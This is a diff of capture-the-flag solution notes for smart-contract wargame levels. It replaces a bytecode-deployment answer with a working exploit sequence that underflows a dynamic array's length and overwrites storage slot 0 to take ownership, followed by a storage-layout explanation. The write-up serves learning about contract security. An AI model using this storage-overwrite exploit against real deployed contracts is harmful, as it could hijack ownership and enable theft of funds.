@@ -1,30 +1,29 @@
 Solution:
-Run in console:
-bytecode = '600a600c600039600a6000f3602a60505260206050f3' 
-txn = await web3.eth.sendTransaction({from: player, data: bytecode}) 
-await contract.setSolver(txn.contractAddress) 
+
+Line to get through modifiers:
+await contract.make_contact()
+
+Line to cause underflow, make codex.length == 2^256-1:
+await contract.retract()
+
+Line takes keccak(1)
+p = web3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"], [1]))
+
+Line gets index of codex array at contract storage slot 0:
+i = BigInt(2 ** 256) - BigInt(p)
+
+Line adds padding to turn 20 bytes into 32 bytes:
+address_value = '0x' + '0'.repeat(24) + player.slice(2)
+
+Overwrite contract storage slot 0:
+await contract.revise(i, address_value)
+
 
 OTHER NOTES:
--a "sendTransaction" that doesn't specify a "to" (so is 0x0), and has data,
-will automatically create a contract.
-
-Bytecode Breakdown:
-Init
--Three stack push operations
--39 COPY = copies the runtime opcode to destination memory location
--Two stack push operations
--f3 RETURN = returns runtime opcode (size 10 bytes) from position
-
-Runtime
--602a = push value 42 (magic number) on stack
--6050 = push a memory position on stack
--52 = MSTORE opcode = stores 42 at location 50.
--6020 = push size (32 bytes) we will return
--6050
--f3 = RETURN opcode = return from memory.
-
--10 bytes allowed for runtime opcode: 1 opcode, say 0x60 is 1 byte. (makes sense since our byte code
-is in hexadecimal format.  Two characters typically 1 byte.)
--bytecode = initialization opcodes + runtime opcode 
--init opcode first 12 bytes = uses stack to copy the runtime opcode from wherever
-it is in memory, to it's preferred memory location.
+* 2^256-1 = number of slots in array AND number of storage slots in a contract.
+* owner variable inherited from parent, stored in slot 0. 20 bytes.  So contact
+variable 1 byte fits in slot 0 too. (21 < 32 bytes).
+* Dynamic Arrays: Contracts storage slot contains the arrays.length, and
+the array's first value array[0] is stored in contract's position keccak(1).
+So in 2^256-1 storage slots, 2^256 will overflow to slot 0.  But, we also
+subtract out keccak(1), which is where the first value started.
